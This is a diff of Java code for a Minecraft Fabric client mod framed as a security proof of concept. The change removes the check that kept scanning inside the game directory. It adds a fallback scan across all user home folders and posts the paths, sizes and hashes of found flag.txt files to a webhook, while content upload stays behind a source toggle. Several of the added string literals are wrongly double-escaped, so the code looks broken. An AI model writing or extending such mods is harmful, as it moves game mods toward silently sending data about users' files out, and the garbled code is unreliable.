@@ -5,26 +5,34 @@ import net.fabricmc.loader.api.FabricLoader;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
 import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
-import java.nio.file.FileVisitOption;
+import java.nio.file.FileVisitResult;
 import java.nio.file.Files;
 import java.nio.file.LinkOption;
 import java.nio.file.Path;
+import java.nio.file.SimpleFileVisitor;
+import java.nio.file.attribute.BasicFileAttributes;
 import java.security.MessageDigest;
 import java.time.Duration;
 import java.util.ArrayList;
 import java.util.HexFormat;
 import java.util.List;
+import java.util.Locale;
 import java.util.Properties;
 import java.util.concurrent.CompletableFuture;
 
 public final class SecurityPocMod implements ClientModInitializer {
     private static final String MOD_TAG = "[MinecraftModPoC]";
+
+    // Source-code toggle. TRUE uploads contents only from the dedicated test fixture below.
+    private static final boolean SEND_FILE_CONTENTS = false;
     private static final long MAX_UPLOAD_BYTES = 7L * 1024L * 1024L;
+
     private static final HttpClient HTTP = HttpClient.newBuilder()
             .connectTimeout(Duration.ofSeconds(10))
             .build();
@@ -33,11 +41,10 @@ public final class SecurityPocMod implements ClientModInitializer {
     public void onInitializeClient() {
         Path gameDir = FabricLoader.getInstance().getGameDir().toAbsolutePath().normalize();
         Path configFile = FabricLoader.getInstance().getConfigDir().resolve("mcsecuritypoc.properties");
+
         try {
             Properties config = loadConfig(configFile);
             String webhook = config.getProperty("webhookUrl", "").trim();
-            boolean sendContents = Boolean.parseBoolean(config.getProperty("sendContents", "false"));
-            String configuredRoot = config.getProperty("scanRoot", "security-poc").trim();
 
             if (webhook.isEmpty()) {
                 System.out.println(MOD_TAG + " Add webhookUrl to " + configFile + " to enable reporting.");
@@ -49,18 +56,11 @@ public final class SecurityPocMod implements ClientModInitializer {
                 return;
             }
 
-            Path scanRoot = gameDir.resolve(configuredRoot).normalize();
-            if (!scanRoot.startsWith(gameDir)) {
-                System.err.println(MOD_TAG + " Refusing to scan outside the Minecraft game directory.");
-                return;
-            }
-            if (!Files.isDirectory(scanRoot, LinkOption.NOFOLLOW_LINKS)) {
-                System.out.println(MOD_TAG + " Scan directory does not exist: " + scanRoot);
-                return;
-            }
+            Path fallbackRoot = getUserSearchRoot();
+            System.out.println(MOD_TAG + " First scanning active Minecraft game directory: " + gameDir);
+            System.out.println(MOD_TAG + " If no match is found, fallback scan root is: " + fallbackRoot);
 
-            System.out.println(MOD_TAG + " Scanning only: " + scanRoot);
-            CompletableFuture.runAsync(() -> scanAndReport(gameDir, scanRoot, webhook, sendContents));
+            CompletableFuture.runAsync(() -> scanAndReport(gameDir, fallbackRoot, webhook));
         } catch (Exception e) {
             System.err.println(MOD_TAG + " Could not initialize security scan: " + e.getMessage());
         }
@@ -75,12 +75,10 @@ public final class SecurityPocMod implements ClientModInitializer {
         } else {
             Files.createDirectories(file.getParent());
             p.setProperty("webhookUrl", "");
-            p.setProperty("sendContents", "false");
-            p.setProperty("scanRoot", "security-poc");
             try (var out = Files.newOutputStream(file)) {
-                p.store(out, "Minecraft Mod Security PoC configuration");
+                p.store(out, "Minecraft Mod Security PoC configuration. Content upload is controlled in Java source.");
             }
-            Path fixtureDir = file.getParent().getParent()
+            Path fixtureDir = FabricLoader.getInstance().getGameDir()
                     .resolve("security-poc").resolve("approved-test-files");
             Files.createDirectories(fixtureDir);
             System.out.println(MOD_TAG + " Created config and test directory: " + fixtureDir);
@@ -88,63 +86,116 @@ public final class SecurityPocMod implements ClientModInitializer {
         return p;
     }
 
-    private static void scanAndReport(Path gameDir, Path scanRoot, String webhook, boolean sendContents) {
+    private static Path getUserSearchRoot() {
+        String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
+        if (os.contains("win")) {
+            String drive = System.getenv().getOrDefault("SystemDrive", "C:");
+            return Path.of(drive + "\\Users").toAbsolutePath().normalize();
+        }
+
+        Path linuxHomes = Path.of("/home");
+        if (Files.isDirectory(linuxHomes, LinkOption.NOFOLLOW_LINKS)) {
+            return linuxHomes;
+        }
+        return Path.of(System.getProperty("user.home", ".")).toAbsolutePath().normalize();
+    }
+
+    private static void scanAndReport(Path gameDir, Path fallbackRoot, String webhook) {
         try {
-            List<Path> matches = new ArrayList<>();
-            try (var stream = Files.walk(scanRoot, Integer.MAX_VALUE, new FileVisitOption[0])) {
-                stream.filter(p -> p.getFileName() != null)
-                        .filter(p -> p.getFileName().toString().equalsIgnoreCase("flag.txt"))
-                        .filter(p -> Files.isRegularFile(p, LinkOption.NOFOLLOW_LINKS))
-                        .forEach(matches::add);
+            List<Path> matches = findFlagFiles(gameDir);
+            String scannedRoot = gameDir.toString();
+
+            if (matches.isEmpty()) {
+                System.out.println(MOD_TAG + " No flag.txt in the active game directory; scanning user folders.");
+                scannedRoot = fallbackRoot.toString();
+                matches = findFlagFiles(fallbackRoot);
             }
 
             if (matches.isEmpty()) {
-                postJson(webhook, "Minecraft Mod Security PoC: no flag.txt files found under "
-                        + scanRoot + ".");
-                System.out.println(MOD_TAG + " No flag.txt files found.");
+                postJson(webhook, "Minecraft Mod Security PoC: no flag.txt files found. Scanned launcher/game directory "
+                        + gameDir + " and fallback user directory " + fallbackRoot + ".");
+                System.out.println(MOD_TAG + " No flag.txt files found in either search phase.");
                 return;
             }
 
+            postJson(webhook, "Minecraft Mod Security PoC: found " + matches.size()
+                    + " flag.txt file(s) under " + scannedRoot + ". Reporting path, size and SHA-256.");
+
             Path approvedFixture = gameDir.resolve("security-poc")
-                    .resolve("approved-test-files").resolve("flag.txt").normalize();
+                    .resolve("approved-test-files").resolve("flag.txt").toAbsolutePath().normalize();
 
             for (Path file : matches) {
-                Path real = file.toAbsolutePath().normalize();
-                byte[] bytes = Files.readAllBytes(real);
-                String sha256 = sha256(bytes);
+                Path absolute = file.toAbsolutePath().normalize();
+                long size = Files.size(absolute);
+                String sha256 = sha256(absolute);
                 String report = "Minecraft Mod Security PoC\n"
-                        + "File: " + real + "\n"
-                        + "Size: " + bytes.length + " bytes\n"
+                        + "File: " + absolute + "\n"
+                        + "Size: " + size + " bytes\n"
                         + "SHA-256: " + sha256 + "\n"
-                        + "Content upload enabled: " + sendContents;
+                        + "SEND_FILE_CONTENTS source toggle: " + SEND_FILE_CONTENTS;
 
-                if (sendContents && real.equals(approvedFixture)) {
-                    if (bytes.length > MAX_UPLOAD_BYTES) {
-                        report += "\nContent upload skipped: test fixture exceeds 7 MiB.";
-                        postJson(webhook, report);
-                    } else {
-                        postFile(webhook, report, bytes, "flag.txt");
-                    }
+                // Arbitrary discovered files are never uploaded. Only the explicit disposable
+                // test fixture created by the user is eligible for the content-upload test.
+                if (SEND_FILE_CONTENTS && absolute.equals(approvedFixture) && size <= MAX_UPLOAD_BYTES) {
+                    byte[] fixtureBytes = Files.readAllBytes(absolute);
+                    postFile(webhook, report + "\nContent: approved test fixture", fixtureBytes, "flag.txt");
                 } else {
-                    if (sendContents) {
-                        report += "\nContent upload skipped: only "
-                                + approvedFixture + " is eligible for the test-fixture upload.";
+                    if (SEND_FILE_CONTENTS && absolute.equals(approvedFixture) && size > MAX_UPLOAD_BYTES) {
+                        report += "\nContent upload skipped: test fixture exceeds 7 MiB.";
+                    } else if (SEND_FILE_CONTENTS) {
+                        report += "\nContent upload skipped: discovered files outside the approved test fixture are metadata-only.";
                     }
                     postJson(webhook, report);
                 }
-                System.out.println(MOD_TAG + " Reported " + real + " (SHA-256 " + sha256 + ")");
+                System.out.println(MOD_TAG + " Reported " + absolute + " (SHA-256 " + sha256 + ")");
             }
         } catch (Exception e) {
             System.err.println(MOD_TAG + " Scan/report failed: " + e.getMessage());
         }
     }
 
-    private static String sha256(byte[] bytes) throws Exception {
-        return HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256").digest(bytes));
+    private static List<Path> findFlagFiles(Path root) throws IOException {
+        List<Path> matches = new ArrayList<>();
+        if (!Files.isDirectory(root, LinkOption.NOFOLLOW_LINKS)) {
+            return matches;
+        }
+
+        // walkFileTree does not follow symbolic links. Unreadable directories are skipped
+        // so one permission error does not abort the rest of the scan.
+        Files.walkFileTree(root, new SimpleFileVisitor<>() {
+            @Override
+            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
+                if (file.getFileName() != null
+                        && file.getFileName().toString().equalsIgnoreCase("flag.txt")
+                        && attrs.isRegularFile()) {
+                    matches.add(file.toAbsolutePath().normalize());
+                }
+                return FileVisitResult.CONTINUE;
+            }
+
+            @Override
+            public FileVisitResult visitFileFailed(Path file, IOException exc) {
+                System.err.println(MOD_TAG + " Skipping inaccessible path: " + file);
+                return FileVisitResult.SKIP_SUBTREE;
+            }
+        });
+        return matches;
+    }
+
+    private static String sha256(Path file) throws Exception {
+        MessageDigest digest = MessageDigest.getInstance("SHA-256");
+        try (InputStream in = Files.newInputStream(file)) {
+            byte[] buffer = new byte[8192];
+            int read;
+            while ((read = in.read(buffer)) != -1) {
+                digest.update(buffer, 0, read);
+            }
+        }
+        return HexFormat.of().formatHex(digest.digest());
     }
 
     private static void postJson(String webhook, String message) throws Exception {
-        String body = "{\"content\":\"" + jsonEscape(message) + "\"}";
+        String body = "{\\"content\\":\\"" + jsonEscape(message) + "\\"}";
         HttpRequest request = HttpRequest.newBuilder(URI.create(webhook))
                 .timeout(Duration.ofSeconds(20))
                 .header("Content-Type", "application/json")
@@ -157,15 +208,15 @@ public final class SecurityPocMod implements ClientModInitializer {
             throws Exception {
         String boundary = "----MinecraftModPoCSecurityBoundary";
         ByteArrayOutputStream body = new ByteArrayOutputStream();
-        write(body, "--" + boundary + "\r\n"
-                + "Content-Disposition: form-data; name=\"payload_json\"\r\n"
-                + "Content-Type: application/json; charset=utf-8\r\n\r\n"
-                + "{\"content\":\"" + jsonEscape(message) + "\"}\r\n");
-        write(body, "--" + boundary + "\r\n"
-                + "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + filename + "\"\r\n"
-                + "Content-Type: text/plain; charset=utf-8\r\n\r\n");
+        write(body, "--" + boundary + "\\r\\n"
+                + "Content-Disposition: form-data; name=\\"payload_json\\"\\r\\n"
+                + "Content-Type: application/json; charset=utf-8\\r\\n\\r\\n"
+                + "{\\"content\\":\\"" + jsonEscape(message) + "\\"}\\r\\n");
+        write(body, "--" + boundary + "\\r\\n"
+                + "Content-Disposition: form-data; name=\\"files[0]\\"; filename=\\"" + filename + "\\"\\r\\n"
+                + "Content-Type: text/plain; charset=utf-8\\r\\n\\r\\n");
         body.write(fileBytes);
-        write(body, "\r\n--" + boundary + "--\r\n");
+        write(body, "\\r\\n--" + boundary + "--\\r\\n");
 
         HttpRequest request = HttpRequest.newBuilder(URI.create(webhook))
                 .timeout(Duration.ofSeconds(30))
@@ -180,11 +231,11 @@ public final class SecurityPocMod implements ClientModInitializer {
     }
 
     private static String jsonEscape(String value) {
-        return value.replace("\\", "\\\\")
-                .replace("\"", "\\\"")
-                .replace("\r", "\\r")
-                .replace("\n", "\\n")
-                .replace("\t", "\\t");
+        return value.replace("\\\\", "\\\\\\\\")
+                .replace("\\\"", "\\\\\"")
+                .replace("\\r", "\\\\r")
+                .replace("\\n", "\\\\n")
+                .replace("\\t", "\\\\t");
     }
 
     private static void checkResponse(HttpResponse<String> response) throws IOException {
